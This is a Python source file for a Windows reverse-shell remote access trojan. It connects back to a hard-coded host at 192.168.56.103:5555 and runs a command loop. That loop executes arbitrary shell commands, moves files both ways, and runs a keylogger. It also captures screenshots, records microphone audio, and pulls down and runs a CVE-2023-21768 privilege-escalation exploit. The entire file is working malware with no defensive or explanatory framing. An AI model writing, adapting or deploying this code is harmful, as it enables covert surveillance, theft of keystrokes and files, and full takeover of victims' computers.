#pip install pyautogui pillow sounddevice scipy pynput pywin32 wmi psutil request first

import socket
import time
import subprocess
import json
import os
import threading
import base64
#import pyautogui
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
from pynput import keyboard
import ctypes
import sys
import winreg
import win32con
import win32api
import win32security
import wmi
import tempfile
from shutil import copy2
import psutil
import requests
from io import StringIO
import urllib.request



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
log = ""
keylogger_running = False
listener = None

# Keylogger functions
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f' [{key}] '

def start_keylogger():
    global listener, keylogger_running
    if not keylogger_running:
        keylogger_running = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

def stop_keylogger():
    global listener, keylogger_running
    if keylogger_running and listener is not None:
        listener.stop()
        keylogger_running = False

# Communication functions
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        s.settimeout(None)
#screenshot and audio record
def screenshot():
    try:
        image = ImageGrab.grab()
        save_path = os.path.join(os.getcwd(), "screen.png")
        image.save(save_path)

        if os.path.exists(save_path):
            reliable_send(f"[*] Screenshot saved at: {save_path}")
            upload_file("screen.png")
            os.remove("screen.png")
        else:
            reliable_send("[ERROR] Screenshot was not saved.")
    except Exception as e:
        reliable_send(f"[ERROR] Screenshot failed: {str(e)}")
def audioRecord():
            reliable_send("[*] Recording 10 seconds of audio...")
            fs = 8000
            seconds = 5
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write("recording.wav", fs, recording)
            upload_file("recording.wav")
            os.remove("recording.wav")
            
# Privilege Escalation Functions
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def is_win11():
    try:
        import platform
        win_ver = platform.version()
        return int(win_ver.split('.')[2]) >= 22000  # Windows 11 build starts from 22000
    except:
        return False





def get_parent_pid_info():
    current_pid = os.getpid()
    process = psutil.Process(current_pid)
    parent = process.parent()
    info =  {
        "current_pid": current_pid,
        "parent_pid": parent.pid,
        "parent_name": parent.name()
    }
    reliable_send(f"Reverse shell PID: {info['current_pid']} Parent (likely PowerShell) PID: {info['parent_pid']}, Name: {info['parent_name']}")
# Privilege Escalation Functions
def cve():
    download_file("Windows_AFD_LPE_CVE-2023-21768_x64.exe")
    try:
        # Get parent PID (PowerShell or CMD)
        parent_pid = psutil.Process(os.getpid()).parent().pid
        
        # Full path to the AFD LPE exploit in current folder
        exe_path = os.path.join(os.getcwd(), "Windows_AFD_LPE_CVE-2023-21768_x64.exe")

        if not os.path.exists(exe_path):
           reliable_send( f"File not found: {exe_path}")

        # Run exploit with parent PID
        result = subprocess.check_output([exe_path, str(parent_pid)], stderr=subprocess.STDOUT)
        reliable_send( f"[+] Exploit executed:\n{result.decode()}")
    
    except subprocess.CalledProcessError as e:
       reliable_send( f"[!] Exploit error:\n{e.output.decode()}")
    except Exception as e:
        reliable_send( f"[!] General error: {str(e)}")

    



# Command shell loop
def shell():
    global log
    while True:
        command = s.recv(1024).decode()
        print(f'[+] received command: {command}')
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        #keylogger
        elif command == 'keylog_start':
            start_keylogger()
            reliable_send("[*] Keylogger started.")
        elif command == 'keylog_stop':
            stop_keylogger()
            reliable_send("[*] Keylogger stopped.")
        elif command == 'keylog_dump':
            reliable_send(log)
            log = ""
        #screenshot and audio recording
        elif command == 'screenshot':
            screenshot()
            
        elif command == 'record_audio':
            audioRecord()
            
         # Privilege escalation commands
        elif command == 'pid':
            get_parent_pid_info()
        elif command == 'check_admin':
            if is_admin():
                reliable_send("[+] Running as Administrator")
            else:
                reliable_send("[-] Not running as Administrator")
           
        elif command == 'uac':
            cve()     
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())


def connection():
    while True:
        try:
            s.connect(('192.168.56.103',5555))
            shell()
            s.close()
            break
        except:
            time.sleep(20)


connection()
